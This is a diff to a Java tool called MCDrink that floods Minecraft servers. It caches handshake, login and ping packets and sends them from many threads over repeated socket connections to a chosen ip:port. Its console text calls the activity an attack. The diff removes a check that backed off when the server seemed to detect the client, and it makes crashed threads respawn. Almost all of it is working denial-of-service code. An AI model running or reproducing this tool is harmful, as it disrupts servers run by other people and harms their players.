@@ -12,6 +12,10 @@ public class main {
 	public static long data=0;
 	public static String[] part1;
 	public static int port;
+	public static byte[] hand;
+	public static byte[] login;
+	public static byte[] ping;
+	public static byte[] pack;
 	public static void main(String[] args) {
 		// TODO 自动生成的方法存根
 		System.out.println("欢迎使用MCDrink,作者:Mr.cacti,github:https://github.com/greyCloudTeam/MCDrink,QQ:3102733279");
@@ -24,6 +28,55 @@ public class main {
 		main.part1=ip.split(":");
 		main.port=Integer.parseInt(part1[1]);
 		int num=Integer.parseInt(threadNum);
+		System.out.println("正在存入缓存");
+		
+		
+		
+		//握手包数据流初始化
+		ByteArrayOutputStream b ;
+		DataOutputStream handshake;
+		//第一次握手
+		try {
+			b= new ByteArrayOutputStream();
+			handshake = new DataOutputStream(b);
+			handshake.write(0x00);
+			main.writeVarInt(handshake,-1);//版本号未知
+			main.writeVarInt(handshake,main.part1[0].length()); //ip地址长度
+			handshake.writeBytes(main.part1[0]); //ip
+			handshake.writeShort(main.port); //port
+			main.writeVarInt(handshake, 1); //state (1 for handshake)
+			hand=b.toByteArray();
+			
+			b= new ByteArrayOutputStream();
+			handshake = new DataOutputStream(b);
+			handshake.write(0x01);
+			handshake.writeLong(Long.MAX_VALUE);
+			ping=b.toByteArray();
+			
+			b= new ByteArrayOutputStream();
+			handshake = new DataOutputStream(b);
+			handshake.write(0x00);
+			main.writeVarInt(handshake,-1);//版本号未知
+			main.writeVarInt(handshake,main.part1[0].length()); //ip地址长度
+			handshake.writeBytes(main.part1[0]); //ip
+			handshake.writeShort(main.port); //port
+			main.writeVarInt(handshake, 2); //state (1 for handshake)
+			login=b.toByteArray();
+			
+			b = new ByteArrayOutputStream();
+			handshake = new DataOutputStream(b);
+			handshake.write(0x00);
+			pack=b.toByteArray();
+			
+		} catch (IOException e) {
+			// TODO 自动生成的 catch 块
+			e.printStackTrace();
+		}//先握手
+		
+		
+		
+		
+		
 		System.out.println("准备完毕,正在启动线程,长时间显示\"[AnotherThread]>0byte\"信息则为攻击失败");
 		Runnable thread4 = new Thread4(); 
 		Thread thread3 = new Thread(thread4);
@@ -70,42 +123,30 @@ class Thread1 implements Runnable {
 				DataOutputStream dos=new DataOutputStream(os);
 				int temp;
 				
-				//握手包数据流初始化
-				ByteArrayOutputStream b = new ByteArrayOutputStream();
-				DataOutputStream handshake = new DataOutputStream(b);
-				
-				//第一次握手
-				handshake.write(0x00);//先握手
-				main.writeVarInt(handshake,-1);//版本号未知
-				main.writeVarInt(handshake,main.part1[0].length()); //ip地址长度
-				handshake.writeBytes(main.part1[0]); //ip
-				handshake.writeShort(main.port); //port
-				main.writeVarInt(handshake, 1); //state (1 for handshake)
-				main.writeVarInt(dos, b.size()); //prepend size
-				dos.write(b.toByteArray()); //write handshake packet
-				dos.flush();
-				b = new ByteArrayOutputStream();
-				handshake = new DataOutputStream(b);
-				handshake.write(0x00);
-				main.writeVarInt(dos, b.size()); //prepend size
-				dos.write(b.toByteArray()); //write handshake packet
+				//握手
+				main.writeVarInt(dos, main.hand.length); //prepend size
+				dos.write(main.hand); //write handshake packet
+				//跟小包
+				main.writeVarInt(dos, main.pack.length); //prepend size
+				dos.write(main.pack); //write handshake packet
 				dos.flush();
 				main.data=main.data+main.readVarInt(di);//读包大小
-				byte[] a=new byte[main.readVarInt(di)];
-				di.readFully(a);
-				
-				//ping包
-				b = new ByteArrayOutputStream();
-				handshake = new DataOutputStream(b);
-				handshake.write(0x00);
-				handshake.writeLong(Long.MAX_VALUE);
-				main.writeVarInt(dos, b.size()); //prepend size
-				dos.write(b.toByteArray()); //write handshake packet
-				dos.flush();
-				main.data=main.data+main.readVarInt(di);
 				main.readVarInt(di);
-				di.readLong();
+				byte[] temp1=new byte[main.readVarInt(di)];
+				di.readFully(temp1);
 				
+				try {
+					//ping包
+					main.writeVarInt(dos, main.ping.length); //prepend size
+					dos.write(main.ping); //write handshake packet
+					dos.flush();
+					main.data=main.data+main.readVarInt(di);
+					main.readVarInt(di);
+					di.readLong();
+					//di.readLong();
+				}catch(Exception e) {
+					
+				}
 				
 				s=new Socket(main.part1[0],main.port);
 				//流准备
@@ -114,31 +155,10 @@ class Thread1 implements Runnable {
 				os=s.getOutputStream();
 				dos=new DataOutputStream(os);
 				//第二次握手
-				b = new ByteArrayOutputStream();
-				handshake = new DataOutputStream(b);
-				handshake.write(0x00);//先握手
-				main.writeVarInt(handshake,-1);//版本号未知
-				main.writeVarInt(handshake,main.part1[0].length()); //ip地址长度
-				handshake.writeBytes(main.part1[0]); //ip
-				handshake.writeShort(main.port); //port
-				main.writeVarInt(handshake, 2); //state (1 for handshake)
-				main.writeVarInt(dos, b.size()); //prepend size
-				dos.write(b.toByteArray()); //write handshake packet
+				main.writeVarInt(dos, main.login.length); //prepend size
+				dos.write(main.login); //write handshake packet
 				dos.flush();
 				main.data=main.data+main.readVarInt(di);
-				if(main.readVarInt(di)==0x00) {
-					//System.out.println("[WARNING]你的ip可能已经被服务器察觉..");
-					di.close();
-					is.close();
-					dos.close();
-					os.close();
-					s.close();
-					continue;
-				}
-				//其他情况均为成功!
-				
-				
-				//关闭流
 				di.close();
 				is.close();
 				dos.close();
@@ -151,7 +171,8 @@ class Thread1 implements Runnable {
 			Runnable thread1 = new Thread1(); 
 			Thread thread2 = new Thread(thread1);
 			thread2.start();//重生!
-			System.out.println("[WARNING]线程自爆,正在复活....");
+			System.out.println("[WARNING]线程自爆,正在复活...."+e.getMessage());
+			e.printStackTrace();
 		}
 	}
 }
